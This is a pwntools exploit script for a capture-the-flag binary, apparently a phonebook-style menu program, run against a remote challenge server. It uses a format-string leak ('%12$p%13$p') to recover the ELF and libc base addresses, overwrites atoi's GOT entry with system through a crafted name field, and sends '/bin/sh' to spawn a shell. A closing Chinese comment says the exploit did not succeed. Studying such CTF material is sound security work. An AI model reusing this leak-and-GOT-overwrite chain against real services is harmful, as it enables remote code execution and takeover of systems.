from pwn import *
from LibcSearcher import *

# io = remote("192.168.170.128", 1234)
# context.arch = "amd64"

io = remote("61.147.171.105",   51565)
# p = remote("node4.buuoj.cn", 28576)
# io = remote("node4.anna.nssctf.cn", 28341)
# io = process('./hello')
# gdb.attach(io)
# context(os='linux', arch = 'amd64', log_level = "debug")
elf = ELF('./hello')
libc = ELF('./libc-2.23.so')


def s(a):
    io.send(a)
def sa(a, b):
    io.sendafter(a, b)
def sl(a):
    io.sendline(a)
def sal(a, b):
    io.sendlineafter(a, b)
def r():
    return (io.recv())
def ru(a):
    return io.recvuntil(a)
def rl():
    io.recvline()
def sla(a, b):
    io.sendlineafter(a, b)
def debug():
    gdb.attach(io)
    pause()
def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
def inter():
    return io.interactive()
def print_addr(name, addr):
    print(f"{name} =",addr)


# context(os='linux', arch='amd64')
context(os='linux', arch = 'amd64', log_level = "debug")

def add(phone_number, name, des_size, des):
    ru("your choice>>")
    sl('1')
    ru("phone number:")
    sl(phone_number)
    sla("name:", name)
    sla("input des size:", str(des_size))
    if des_size >= 0:
        sla("des info:", des)


def delete(index):
    ru("your choice>>")
    sl('2')
    sla('input index:', index)

def show(index):
    ru("your choice>>")
    sl('3')
    sla('input index:', index)

def edit(index, number, name, des):
    ru("your choice>>")
    sl('4')
    sla('input index:', index)
    sla('phone number:', number)
    sla('name:', name)
    sla('des info:', des)

add("%12$p%13$p", "fx", 128, '0' * 16)
show("0")
elf_libc_base = ru('name')[-33:-5]
# pause()
print("elf_libc_base =", elf_libc_base)
elf_base = int(elf_libc_base[0:15],16) - 0x12a0
print("elf_base =", hex(elf_base))

libc__libc_start_main_off = libc.symbols["__libc_start_main"]

libc_base = int(elf_libc_base[16:], 16) - libc__libc_start_main_off - 128
print("libc_base =", hex(libc_base))

atoi_got = elf.got['atoi'] + elf_base
# print("atio_got = ", hex(atoi_got))
system_addr = libc.symbols['system'] + libc_base
print_addr("system_addr", hex(system_addr))
overwrite_name_payload = b'a' * 0x13 + p64(atoi_got)
edit("0", '0', overwrite_name_payload, p64(system_addr))
ru("your choice>>")
sl("/bin/sh")

inter()
#没打通，且堆部分的知识没看太懂，留做(用gdb动调查看+add()函数结合可以画出chunk的数据结构)